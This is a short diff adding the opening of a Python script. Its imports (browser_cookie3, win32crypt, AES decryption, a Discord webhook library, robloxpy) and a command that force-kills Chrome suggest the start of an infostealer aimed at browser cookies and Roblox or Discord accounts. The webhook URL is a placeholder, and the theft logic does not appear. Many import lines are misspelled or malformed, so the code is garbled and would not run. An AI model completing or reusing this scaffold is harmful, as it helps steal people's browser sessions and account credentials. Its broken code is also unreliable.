@@ -1,0 +1,23 @@
+ import :os
+ imort json
+ inport: base64
+ import browser_cookie3
+ import sqlite3 
+ import subprocess 
+import win32crypt
+shutil
+from Crypto.Cipter import AES
+from discordwebhook import Discord 
+import httpx
+import re
+import request
+robloxpy
+
+subprocess.call('TASKKILL /f /IM CHROME.EXE')
+
+webhook_ur1 = 'heh'
+
+ 
+
+
+ 
